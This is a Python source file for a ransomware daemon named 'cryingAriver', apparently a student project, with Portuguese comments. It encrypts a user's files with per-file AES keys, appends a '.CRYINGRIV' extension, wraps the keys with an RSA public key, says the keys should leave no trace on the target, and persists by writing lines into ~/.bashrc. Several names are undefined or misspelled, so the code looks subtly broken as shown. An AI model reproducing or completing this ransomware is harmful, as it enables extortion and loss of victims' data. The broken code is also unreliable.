#!/usr/bin/env python
# _*_coding: UTF-8
from Crypto.Hash import SHA, MD5
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto import Random
from getters import Getters
from randomkey import generate_randomKey
from symencrypt import AESHash
from paths_and_names import _name, _home, _home, _ransomware_path
import base64, subprocess, pickle, gc, random, time, os

get = Getters()

def open_decryptor():
		process = subprocess.Popen('Pidof decryptor', shell= True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		out = process.stdout.read() + process.stderr.read()
		if (out):
			return 
		os.chdir(_ransomware_path)
		gnome = 'gnome-terminal --command ./decryptor'
		os.system('gnome')
		xfce = 'xfce4-terminal --command=./decryptor'
		os.system(xfce)

class Daemon():
	def __init__(self):
		
		# caminho de teste para alguns arquivos
		self.test_path = '/home/acquila/Documentos/Documentos/UFG/7P/SAS/cryingariver-ransomware/cryingAriver-Ransomware/teste/'

		#Recupera a chave pública do cliente
		with open(_ransomware_path + '/client_public_key.PEM', 'r') as file:
			client_PuKey = file.read()

		self.client_PuKey_obj = RSA.importKey(client_PuKey)

	def get_rans_paths(self):
		with open(_ransomware_path + '/AES_encrypted_keys.txt') as file:
			r = file.read().split("\n")
		for aes in r:
			yield aes[1]

	# Aqui começa a criptografia dos arquivos nos diretórios
	def encryption(self, files):
		if not files:
			print("No files included")
			return None

		for file in files:
			# Gera uma chave aleatória de 128 bits, criptografada em base64
			key = randomKey_generate(128, True)

			# Gera uma cifra criptográfica da chave
			AES_obj = symmetric.AESHash(key)

			# Decodifica o arquivo decodificado em base64
			file = base64.b64decode(file)

			# Verifica o conteúdo do arquivo
			with open(file, 'rb') as f:
				content = f.read()

			# Criptografa o conteúdo do arquivo com a chave aleatória gerada
			encrypted = AES_obj.encrypt(content)
			# Adiciona ao nome do arquivo uma extensão de identificação de criptografia
			new_name = file + ".CRYINGRIV"

			# insere o arquivo criptografado
			with open(new_name, 'wb') as f:
				f.write(encrypted)

			#--------------------------------- Está dando erro aqui
			yield (key, base64.b64encode(new_name))


	def deamon_main(self):
		new_files = get.get_files(test_path)
		key_b64name = self.encryption(new_files)

		if (key_b64name != None):
			with open(_ransomware_path + '/AES_encrypted_keys.txt', a) as file:
				for ret in key_b64name:
					cipher = PKCS1_OAEP.new(client_public_key_obj)
					encrypted_key = cipher.encrypt(r[0])

					f.write(base64.b64encode(encrypted_key) + " " + ret[1] + "\n")

			key_b64name = None
			del key_b64name
			# Chama o Garbage Collector
			# Não devemos deixar qualquer rastro das chaves no usuário alvo
			gc.collect()

	def persist(self):
		alias = "alias 'daemon'='{}/daemon';".format(ransomware_path)
		daemon = "daemon;"
		nano = 'echo "' +  alias + '" >> ~/.bashrc '
		nano2 = 'echo "' + daemon + '" >> ~/.bashrc '
		os.system(nano)
		os.system(nano2)

if __name__ == '__main__':

	daemon = Daemon()
	daemon.persist()
	while True:
		daemon.daemon_main()
		open_decryptor()
		time.sleep(30)